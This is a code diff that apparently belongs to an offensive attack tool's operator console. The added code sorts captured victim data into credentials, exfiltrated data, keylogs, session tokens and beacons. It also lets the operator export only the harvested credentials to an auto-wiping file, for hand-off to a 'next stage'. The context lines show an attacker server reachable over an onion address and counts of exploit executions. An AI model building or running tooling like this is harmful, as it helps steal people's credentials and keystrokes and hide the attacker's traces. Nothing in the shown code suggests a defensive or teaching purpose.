@@ -3525,7 +3525,29 @@ def _walkthrough_control_deck(exploitable, base_url, _sp,
         )
         print(f"  {B}Server:{N}      {server_state}  "
               f"{'('+ _onion +')' if _onion else '(loopback-only)' if infra_is_loopback else ''}")
-        print(f"  {B}Captures:{N}    {cap_count}")
+        # Captures breakdown by kind. Showing just 'Captures: 42'
+        # is useless — operators want to know 'did the credential
+        # harvest work?' (check c=) and 'how many keylog pings have
+        # I got?' (check k=). Count by kind in a single pass.
+        if cap_count > 0 and server.is_running:
+            _by_kind = {"credentials": 0, "exfil": 0, "keylog": 0,
+                        "session": 0, "beacon": 0, "unknown": 0}
+            for _c in server.get_captures(last_n=cap_count):
+                _k = _c.get("kind", "unknown")
+                _by_kind[_k] = _by_kind.get(_k, 0) + 1
+            _parts = []
+            for _kname, _kshort, _kcolor in (
+                ("credentials", "c", R), ("exfil", "x", M),
+                ("keylog", "k", Y), ("session", "s", R),
+                ("beacon", "b", C),
+            ):
+                _n = _by_kind.get(_kname, 0)
+                if _n:
+                    _parts.append(f"{_kcolor}{_kshort}={_n}{N}")
+            _brk = "  [" + " ".join(_parts) + "]" if _parts else ""
+            print(f"  {B}Captures:{N}    {cap_count}{_brk}")
+        else:
+            print(f"  {B}Captures:{N}    {cap_count}")
         print(f"  {B}Executions:{N}  {stats['executions']} "
               f"({stats['successes']} ok, {stats['failures']} fail)")
         print(f"  {B}Files:{N}       "
@@ -4310,20 +4332,62 @@ def _target_health_check(executor, attacker_url, server, audit):
               success=(200 <= status < 400))
 
 
-def _save_captures_to_file(server, file_mgr):
+_KIND_FULL_NAMES = {
+    "c": "credentials", "x": "exfil", "k": "keylog",
+    "s": "session",     "b": "beacon",
+}
+
+
+def _prompt_kind_filter() -> Optional[str]:
+    """Ask the operator to optionally restrict an operation to one
+    callback kind (c/x/k/s/b). Returns the full name (e.g.
+    'credentials') or None for no filter. Blank keeps 'all'."""
+    choice = prompt(
+        "Filter by kind? (c=credentials x=exfil k=keylog "
+        "s=session b=beacon, blank=all)", "").strip().lower()
+    if not choice:
+        return None
+    if choice in _KIND_FULL_NAMES:
+        return _KIND_FULL_NAMES[choice]
+    if choice in _KIND_FULL_NAMES.values():
+        return choice
+    warn(f"Unknown kind {choice!r} — proceeding with ALL captures.")
+    return None
+
+
+def _save_captures_to_file(server, file_mgr,
+                            kind_filter: Optional[str] = None):
     """Dump the current capture buffer to an ephemeral JSON file in
     /dev/shm/intel. Operator can inspect without the buffer being
-    wiped by a future teardown."""
+    wiped by a future teardown.
+
+    kind_filter=None exports everything. kind_filter='credentials'
+    etc. restricts to one channel — useful when the operator only
+    wants to hand off 'the credentials I captured' to the next
+    stage without shipping the full keylog/beacon stream.
+    """
     if not server or not server.is_running:
         warn("Server is not running — nothing to save.")
         return
+    if kind_filter is None:
+        _explicit = prompt(
+            "Save all captures or just one kind? (A=all, "
+            "F=filter by kind)", "A").strip().upper()
+        if _explicit == "F":
+            kind_filter = _prompt_kind_filter()
     caps = server.get_captures(last_n=9999)
+    if kind_filter:
+        caps = [c for c in caps
+                if (c.get("kind") or "") == kind_filter]
     if not caps:
-        info("Capture buffer is empty.")
+        info("No captures match the filter." if kind_filter
+             else "Capture buffer is empty.")
         return
+    meta_kind = kind_filter or "all"
     blob = json.dumps(
         {
             "captured": len(caps),
+            "kind_filter": meta_kind,
             "attacker_base": server.get_attacker_url(prefer_onion=True),
             "onion_host": server.onion_host,
             "captures": caps,
@@ -4331,11 +4395,11 @@ def _save_captures_to_file(server, file_mgr):
         indent=2,
     )
     out_path = file_mgr.generate(
-        exploit_type="captures",
+        exploit_type=f"captures_{meta_kind}",
         content=blob,
         extension=".json",
     )
-    ok(f"Saved {len(caps)} captures to {out_path.name} "
+    ok(f"Saved {len(caps)} {meta_kind} capture(s) to {out_path.name} "
        f"(ephemeral, 0o600, auto-wipes)")
 
 
